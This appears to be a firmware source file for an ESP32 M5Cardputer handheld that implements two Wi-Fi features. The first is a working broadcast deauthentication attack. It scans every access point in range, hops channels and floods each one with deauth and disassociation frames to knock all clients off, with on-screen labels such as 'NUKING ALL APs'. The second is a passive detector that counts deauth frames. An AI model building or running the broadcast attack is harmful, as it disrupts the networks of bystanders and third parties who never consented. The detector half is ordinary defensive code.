/*
 * wifi_deauth_extras — broadcast deauth (kick ALL clients on an AP at
 * once) and passive deauth detector.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include <WiFi.h>
#include <esp_wifi.h>

/* ========== Broadcast deauth: nuke every AP in range ========== */

#define DB_MAX_APS 48

struct db_target_t { uint8_t bssid[6]; uint8_t channel; char ssid[24]; };
static db_target_t s_b_targets[DB_MAX_APS];
static volatile int s_b_target_n = 0;
static volatile int s_b_cursor = 0;
static volatile bool     s_b_running = false;
static volatile uint32_t s_b_sent    = 0;
static volatile uint32_t s_b_errs    = 0;
static uint16_t          s_b_seq     = 0;

static void broad_task(void *)
{
    /* Rotate through every AP: hop channel, blast a burst of deauths,
     * move on. Fastest total coverage. Each iteration fires 16 pairs =
     * 32 frames (deauth+disassoc) per AP per rotation. */
    while (s_b_running) {
        if (s_b_target_n == 0) { delay(100); continue; }
        const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
        esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
        for (int i = 0; i < 16 && s_b_running; ++i) {
            int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
            s_b_sent += ok;
            s_b_errs += (2 - ok);
            delay(6);
        }
        s_b_cursor++;
    }
    vTaskDelete(nullptr);
}

static void db_scan_populate(void)
{
    s_b_target_n = 0;
    int n = WiFi.scanNetworks(false, true, false, 120);
    if (n <= 0) return;
    for (int i = 0; i < n && s_b_target_n < DB_MAX_APS; ++i) {
        db_target_t &t = s_b_targets[s_b_target_n++];
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = WiFi.channel(i);
        strncpy(t.ssid, WiFi.SSID(i).c_str(), sizeof(t.ssid) - 1);
        t.ssid[sizeof(t.ssid) - 1] = '\0';
    }
    WiFi.scanDelete();
}

void feat_wifi_deauth_broadcast(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("NUKING ALL APs");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 20); d.print("scanning 2.4 GHz...");
    ui_draw_footer("scanning");
    ui_radar(SCR_W / 2, BODY_Y + 60, 24, T_ACCENT);

    db_scan_populate();
    if (s_b_target_n == 0) {
        ui_toast("no APs found", T_BAD, 1500);
        return;
    }

    esp_wifi_set_promiscuous(true);
    s_b_sent = 0;
    s_b_errs = 0;
    s_b_cursor = 0;
    s_b_seq = (uint16_t)(esp_random() & 0x0FFF);
    s_b_running = true;
    xTaskCreate(broad_task, "deauth_all", 3072, nullptr, 4, nullptr);

    /* Dramatic intro. */
    ui_action_overlay("NUKE LAUNCHED", "jamming every AP in sight",
                      ACT_BG_GLITCH, T_ACCENT2, 900);

    ui_clear_body();
    ui_draw_footer("`=stop");
    uint32_t last = 0;
    int last_cur = -1;
    uint32_t last_sent = 0;
    while (true) {
        uint32_t now = millis();

        int cur = s_b_target_n ? (s_b_cursor % s_b_target_n) : 0;
        bool rotated = (cur != last_cur);
        last_cur = cur;

        if (now - last > 200) {
            last = now;
            ui_clear_body();
            ui_dashboard_chrome(">> DEAUTH ALL <<", rotated);

            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 16);
            d.printf("targets: %d", s_b_target_n);
            d.setCursor(4, BODY_Y + 26);
            d.printf("frames : %lu", (unsigned long)s_b_sent);
            uint32_t fps = (s_b_sent - last_sent) * 5;
            last_sent = s_b_sent;
            d.setTextColor(fps > 40 ? T_ACCENT : T_WARN, T_BG);
            d.setCursor(4, BODY_Y + 36);
            d.printf("rate   : %lu/s  drop:%lu",
                     (unsigned long)fps, (unsigned long)s_b_errs);

            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 28);

            const db_target_t &t = s_b_targets[cur];
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 50);
            d.printf("> %.20s", t.ssid[0] ? t.ssid : "<hidden>");
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 62);
            d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
                     t.channel,
                     t.bssid[0], t.bssid[1], t.bssid[2],
                     t.bssid[3], t.bssid[4], t.bssid[5]);

            ui_draw_status(radio_name(), "NUKE-ALL");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    s_b_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
}

/* ========== Deauth detector: passively count deauth frames ========== */

static volatile uint32_t s_det_count = 0;
static volatile uint32_t s_det_total = 0;
static uint8_t s_det_last_bssid[6] = {0};

static void det_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 26) return;
    uint8_t fc = pkt->payload[0];
    uint8_t subtype = (fc >> 4) & 0xF;
    /* 0xC = deauth, 0xA = disassociation */
    if (subtype == 0xC || subtype == 0xA) {
        s_det_count++;
        s_det_total++;
        memcpy((void *)s_det_last_bssid, pkt->payload + 16, 6);
    }
}

void feat_wifi_deauth_detect(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(det_cb);

    s_det_count = 0;
    s_det_total = 0;
    uint8_t ch = 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    ui_clear_body();
    ui_draw_footer(";/.=channel  `=stop");
    uint32_t last = 0;
    uint32_t window_ms = millis();
    uint32_t window_count = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            if (millis() - window_ms > 1000) {
                window_count = s_det_count;
                s_det_count = 0;
                window_ms = millis();
            }
            auto &d = M5Cardputer.Display;
            ui_clear_body();
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("DEAUTH DETECT");
            d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 22); d.printf("channel : %u", ch);
            d.setTextColor(window_count > 5 ? T_BAD : T_GOOD, T_BG);
            d.setCursor(4, BODY_Y + 34); d.printf("rate    : %lu/s", (unsigned long)window_count);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 46); d.printf("total   : %lu", (unsigned long)s_det_total);
            if (s_det_total > 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 60);
                d.printf("last BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                         s_det_last_bssid[0], s_det_last_bssid[1], s_det_last_bssid[2],
                         s_det_last_bssid[3], s_det_last_bssid[4], s_det_last_bssid[5]);
            }
            ui_draw_status(radio_name(), "dauth-det");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
        if (k == '.' || k == PK_DOWN) { if (ch > 1)  { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); } }
    }
    esp_wifi_set_promiscuous(false);
}
